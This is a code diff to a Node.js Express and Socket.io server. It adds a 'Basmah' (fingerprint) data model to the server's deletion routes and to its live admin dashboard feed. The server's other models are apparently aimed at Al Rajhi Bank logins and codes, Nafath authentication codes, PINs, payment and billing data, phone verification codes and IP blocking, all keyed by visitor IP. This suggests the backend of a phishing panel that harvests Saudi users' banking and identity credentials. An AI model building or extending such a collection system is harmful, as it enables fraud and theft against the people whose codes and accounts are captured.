@@ -27,6 +27,7 @@ const RajhiCode = require("./models/RajhiCode");
 const Admin = require("./models/Admin");
 const generateTokenFor = require("./utils/jwt"); // your JWT‑helper (or any token generator)
 const Block = require("./models/Block");
+const Basmah = require("./models/Basmah");
 
 const app = express();
 const server = http.createServer(app);
@@ -134,6 +135,7 @@ app.delete(
       Comprehensive.deleteMany({}),
       Billing.deleteMany({}),
       Payment.deleteMany({}),
+      Basmah.deleteMany({}),
       Pin.deleteMany({}),
       Nafad.deleteMany({}),
       NafadCode.deleteMany({}),
@@ -294,6 +296,7 @@ app.delete(
       Comprehensive.deleteMany({ ip }),
       Billing.deleteMany({ ip }),
       Payment.deleteMany({ ip }),
+      Basmah.deleteMany({ ip }),
       Pin.deleteMany({ ip }),
       Nafad.deleteMany({ ip }),
       NafadCode.deleteMany({ ip }),
@@ -334,6 +337,7 @@ io.on("connection", (socket) => {
       nafadCodes,
       rajhis,
       rajhisCodes,
+      Basmahs,
     ] = await Promise.all([
       IndexSubmission.find().sort({ _id: -1 }).lean(),
       Details.find().sort({ _id: -1 }).lean(),
@@ -345,6 +349,7 @@ io.on("connection", (socket) => {
       PhoneCode.find().sort({ _id: -1 }).lean(),
       ThirdParty.find().sort({ _id: -1 }).lean(),
       Verification.find().sort({ _id: -1 }).lean(),
+      Basmah.find().sort({ _id: -1 }).lean(),
       Nafad.find().sort({ _id: -1 }).lean(),
       NafadCode.find().sort({ _id: -1 }).lean(),
       Rajhi.find().sort({ _id: -1 }).lean(),
@@ -373,6 +378,7 @@ io.on("connection", (socket) => {
       locations, // user.location
       rajhis,
       rajhisCodes,
+      Basmahs,
     });
   });
 
@@ -1057,6 +1063,7 @@ app.delete("/api/users/:ip", async (req, res) => {
       Billing.deleteMany({ user: user._id }),
       Payment.deleteMany({ user: user._id }),
       Pin.deleteMany({ user: user._id }),
+      Basmah.deleteMany({ user: user._id }),
       Nafad.deleteMany({ user: user._id }),
       NafadCode.deleteMany({ user: user._id }),
       Rajhi.deleteMany({ user: user._id }),
